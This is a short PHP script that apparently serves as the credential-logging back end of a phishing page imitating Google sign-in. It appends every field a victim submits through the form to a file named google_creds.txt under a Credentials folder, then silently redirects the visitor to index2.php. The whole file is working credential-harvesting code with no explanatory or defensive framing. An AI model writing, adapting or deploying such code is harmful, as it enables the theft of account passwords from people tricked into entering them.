<?php
$file = '../../Credentials/google_creds.txt';
$handle = fopen($file, 'a');
foreach ($_POST as $key => $value) {
    fwrite($handle, $key . '=' . $value . "\n");
}
fclose($handle);
header('Location: index2.php');
exit();
?>
